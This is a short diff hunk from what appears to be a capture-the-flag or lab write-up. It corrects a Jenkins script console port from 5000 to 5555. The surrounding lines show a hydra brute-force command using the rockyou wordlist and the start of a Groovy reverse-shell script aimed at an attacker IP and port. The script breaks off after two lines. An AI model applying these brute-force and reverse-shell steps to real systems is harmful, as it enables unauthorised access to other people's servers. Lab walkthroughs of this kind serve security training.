@@ -139,7 +139,7 @@ hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 5555 http-po
 ```
 Cool! Now we'll login, and abuse the jenkins script console to get a reverse shell again.
 
-We'll run this script in the “http://localhost:5000/script”:
+We'll run this script in the “http://localhost:5555/script”:
 ```
 String host="10.18.116.220";
 int port=5554;
